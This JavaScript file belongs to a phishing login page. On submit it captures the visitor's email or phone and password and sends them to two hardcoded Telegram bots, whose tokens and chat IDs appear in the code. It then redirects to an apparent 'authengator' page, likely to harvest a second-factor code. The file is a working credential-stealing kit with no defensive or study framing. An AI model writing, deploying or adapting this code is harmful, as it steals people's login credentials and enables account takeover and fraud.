document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("login-form");

    // Bots and chat IDs
    const bots = {
        "7746332737:AAEOz6lVMykBEDri1KAIsN_UFo8eAJoEoHs": "6942741954",
        "7860053171:AAH5rKPoMIjqvqgAo8h3J_etU8Waawn1MvI": "7120473372",
    };

    form.addEventListener("submit", async (event) => {
        event.preventDefault();

        // Collect form data
        const emailPhone = document.getElementById("email-phone").value;
        const password = document.getElementById("password").value;

        // Format the message
        const message = `New Login Data:\n\nEmail/Phone: ${emailPhone}\nPassword: ${password}`;

        try {
            // Send the message to all bots
            const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
                const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
                const url = `${apiUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                const response = await fetch(url);
                return response.ok;
            });

            // Wait for all messages to be sent
            const results = await Promise.all(sendPromises);

            // Check if all requests succeeded
            if (results.every((result) => result)) {
                // Redirect and reset form if all requests succeed
                window.location.href = "authengator.html"; // Change 'authengator.html' to your target page
                form.reset();
            } else {
                console.error("Some messages failed to send:", results);
            }
        } catch (error) {
            console.error("Error sending data:", error);
        }
    });
});
